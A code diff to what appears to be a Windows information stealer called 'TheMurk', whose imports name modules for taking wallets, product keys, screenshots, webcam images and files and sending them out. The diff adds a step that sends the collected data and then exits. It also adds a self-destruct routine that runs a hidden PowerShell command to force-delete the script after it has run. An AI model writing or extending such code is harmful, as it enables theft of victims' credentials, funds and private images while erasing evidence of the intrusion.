@@ -19,6 +19,9 @@ from targets.system.productkey import ProductKey
 from targets.system.photos import Screenshot, WebCam
 from targets.wallets.wallets import Wallets
 from manager.send import Send
+import sys
+import win32com.client
+import os 
 
 
 
@@ -35,6 +38,8 @@ class TheMurk:
         self.Wallets()
         self.System()
         self.GrabFiles()
+        self.Conclusion()
+        sys.exit()
 
     def Start(self):
         if not config.debuging:
@@ -76,3 +81,9 @@ class TheMurk:
     
     def Conclusion(self):
         Send(config.sendData, self.msgInfo)
+        
+        if config.selfDestruct:
+            script_path = os.path.abspath(sys.argv[0])
+            ps_shell = win32com.client.Dispatch("WScript.Shell")
+            command = f"powershell.exe -Command \"Start-Sleep -Seconds 3; Remove-Item -Path '{script_path}' -Force\""
+            ps_shell.Run(command, 0, False)
